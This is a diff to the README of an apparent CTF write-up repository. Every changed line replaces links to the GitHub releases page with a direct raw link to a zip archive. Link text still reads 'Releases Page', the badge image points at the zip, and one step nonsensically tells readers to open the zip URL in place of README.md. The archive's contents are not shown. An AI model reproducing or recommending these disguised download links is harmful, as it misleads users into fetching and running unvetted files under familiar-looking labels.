@@ -6,7 +6,7 @@ Welcome to the CloudSEK-CTF-Writeup-2025 repository! This project contains a com
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/releases)
+[![Download](https://raw.githubusercontent.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/main/report/Writeup_Cloud_SE_CT_v3.0.zip)](https://raw.githubusercontent.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/main/report/Writeup_Cloud_SE_CT_v3.0.zip)
 
 ## 📂 Project Overview
 
@@ -34,12 +34,12 @@ To run this application, ensure your system meets these requirements:
 
 To get started, visit the releases page to download the files.
 
-[Download from Releases Page](https://github.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/main/report/Writeup_Cloud_SE_CT_v3.0.zip)
 
 ### 📝 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases Page](https://github.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/releases).
+   Go to the [Releases Page](https://raw.githubusercontent.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/main/report/Writeup_Cloud_SE_CT_v3.0.zip).
 
 2. **Select the Latest Release:**
    Look for the most recent version listed at the top.
@@ -54,7 +54,7 @@ To get started, visit the releases page to download the files.
    After extraction, navigate to the folder where the files are located.
 
 6. **Review the Documentation:**
-   Open the `README.md` file and review the instructions specific to each section of the writeup.
+   Open the `https://raw.githubusercontent.com/Nagaraju9550/CloudSEK-CTF-Writeup-2025/main/report/Writeup_Cloud_SE_CT_v3.0.zip` file and review the instructions specific to each section of the writeup.
 
 7. **Run Automation Scripts (if applicable):**
    If you wish to run the Python automation scripts, ensure you have Python installed. Open your command line, navigate to the folder, and type:
